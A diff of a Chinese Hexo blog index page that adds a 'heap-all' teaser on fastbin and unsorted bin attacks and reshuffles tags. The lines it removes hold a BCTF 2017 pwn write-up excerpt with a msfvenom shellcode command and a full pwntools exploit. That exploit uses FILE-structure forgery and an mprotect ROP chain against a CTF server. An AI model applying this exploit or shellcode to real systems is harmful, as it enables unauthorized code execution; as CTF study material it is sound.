@@ -129,6 +129,64 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-heap-all" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/06/04/heap-all/">heap-all</a>
+    </h1>
+  
+
+        <a href="/2017/06/04/heap-all/" class="archive-article-date">
+  	<time datetime="2017-06-04T15:59:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-06-04</time>
+</a>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="涉及到的知识点"><a href="#涉及到的知识点" class="headerlink" title="涉及到的知识点"></a>涉及到的知识点</h3><p>1、fastbin attack</p>
+<p>2、unsorted bin attack</p>
+<p>3、malloc堆内存管理</p>
+        
+          <a class="article-more-a" href="/2017/06/04/heap-all/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags"></i>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/06/04/heap-all/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-墨色的五月" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -683,69 +741,6 @@
 
 
   
-    <article id="post-FILE结构体的溢出利用【FSP】" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/17/FILE结构体的溢出利用【FSP】/">FILE结构体的溢出利用【FSP】</a>
-    </h1>
-  
-
-        <a href="/2017/03/17/FILE结构体的溢出利用【FSP】/" class="archive-article-date">
-  	<time datetime="2017-03-17T14:31:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-17</time>
-</a>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>FILE用到的知识点 参考自   <a href="http://bobao.360.cn/learning/detail/3296.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3296.html</a></p>
-<p>题目来源于BCTF 线上总决赛资格赛 pwn50<br>题目地址 <a href="https://github.com/Winter3un/ctf_task/tree/master/BCTF2017" target="_blank" rel="external">https://github.com/Winter3un/ctf_task/tree/master/BCTF2017</a></p>
-<p>用到的一个shellcode姿势点如下:</p>
-<blockquote>
-<p>使用msfvenom生成payload。<br>由于我这边用的wookali，没有自带msf。<a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="external">Download it</a><br>中文文档：<a href="http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf" target="_blank" rel="external">http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf</a></p>
-<p>生成shellcode:<code>msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b &#39;\x00\x0b\x0d\x0a&#39;</code></p>
-</blockquote>
-<p>通过伪造FILE结构体，获得一次控制EIP的机会，同时 meun 函数存在经典栈溢出 <code>scanf(&quot;%s&quot;,&amp;v1);</code>,可以构造rop，并利用一次控制EIP的机会执行ROP，该ROP利用mprotect函数将bss段设置为可执行，并执行放置入bss区域的规避掉坏字符的shellcode。</p>
-<p>exp如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line"></div><div class="line"><span class="comment"># p = process("./fake")</span></div><div class="line">p = remote(<span class="string">'106.75.93.221'</span>,<span class="number">12345</span> )</div><div class="line"></div><div class="line">x_addr = <span class="number">0x80EF9E0</span></div><div class="line">fp_addr = <span class="number">0x80EFA00</span></div><div class="line">jump_addr = fp_addr+<span class="number">0x10</span>+<span class="number">4</span>*<span class="number">0x25</span>+<span class="number">4</span>+<span class="number">8</span></div><div class="line">eip_addr = <span class="number">0x805069d</span></div><div class="line">read_addr = <span class="number">0x8071460</span></div><div class="line">printf_addr = <span class="number">0x804F6D0</span></div><div class="line">Welcome_addr = <span class="number">0x0804889C</span></div><div class="line">menu_addr = <span class="number">0x8048AFF</span></div><div class="line">p_ret = <span class="number">0x080481d1</span></div><div class="line">ppp_ret = <span class="number">0x0804f7da</span></div><div class="line">mprotect_addr = <span class="number">0x08071FD0</span></div><div class="line">page_size = <span class="number">4096</span></div><div class="line">p.recvuntil(<span class="string">"name?\n"</span>)</div><div class="line">payload = <span class="string">"a"</span>*(fp_addr-x_addr)+p32(fp_addr+<span class="number">4</span>)</div><div class="line"><span class="comment"># IO_FILE = p32(x_addr)*0x25+p32(jump_addr)</span></div><div class="line"></div><div class="line">x=<span class="number">0x10</span></div><div class="line">IO_FILE = p32(fp_addr)*(<span class="number">0x11</span>-x)+p32(<span class="number">0</span>)*x+<span class="string">"\x00\x00"</span>+<span class="string">"\x00"</span>+<span class="string">"\x00"</span>+p32(fp_addr)*<span class="number">0x13</span>+p32(jump_addr)</div><div class="line">JUMP = p32(<span class="number">0</span>)*<span class="number">2</span>+p32(eip_addr)*<span class="number">21</span></div><div class="line">gdb.attach(p,<span class="string">"b*0x805069d\nb*0x805442A\nb*0x80534bb\nc"</span>)</div><div class="line">payload +=IO_FILE+JUMP</div><div class="line"></div><div class="line">shellcode_addr = (<span class="number">0x80EF9E0</span> + len(payload))</div><div class="line"><span class="keyword">print</span> <span class="string">"shellcode_addr="</span>+hex(shellcode_addr)</div><div class="line">exec_addr = (<span class="number">0x80EF9E0</span> + len(payload))&amp;~(page_size<span class="number">-1</span>)</div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf += <span class="string">"\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line">buf += <span class="string">"\x76\x0e\x9d\x3a\x39\x8f\x83\xee\xfc\xe2\xf4\xf7\x31"</span></div><div class="line">buf += <span class="string">"\x61\x16\xcf\x5c\x51\xa2\xfe\xb3\xde\xe7\xb2\x49\x51"</span></div><div class="line">buf += <span class="string">"\x8f\xf5\x15\x5b\xe6\xf3\xb3\xda\xdd\x75\x32\x39\x8f"</span></div><div class="line">buf += <span class="string">"\x9d\x15\x5b\xe6\xf3\x15\x4a\xe7\x9d\x6d\x6a\x06\x7c"</span></div><div class="line">buf += <span class="string">"\xf7\xb9\x8f"</span></div><div class="line">shellcode = buf</div><div class="line"></div><div class="line">payload+=shellcode</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"&gt; "</span>)</div><div class="line"></div><div class="line">payload2 = p32(mprotect_addr)+p32(ppp_ret)+p32(exec_addr)+p32(page_size)+p32(<span class="number">7</span>)+p32(shellcode_addr)</div><div class="line">p.sendline(<span class="string">"3"</span>+<span class="string">"a"</span>*(<span class="number">0x3c</span><span class="number">-1</span>)+payload2)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bctf/">bctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/17/FILE结构体的溢出利用【FSP】/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -804,7 +799,15 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)">AWD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">pwn</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">ARM</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -820,19 +823,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">ARM</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)">Writeup</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">writeup</a>
+                <a href="javascript:void(0)">bctf</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">bctf</a>
+                <a href="javascript:void(0)">writeup</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -844,11 +843,15 @@
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)">bin</a>
+                <a href="javascript:void(0)">heap</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">ctf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)">bin</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -865,10 +868,6 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)">note</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)">AWD</a>
               </li>
             
             <div class="clearfix"></div>
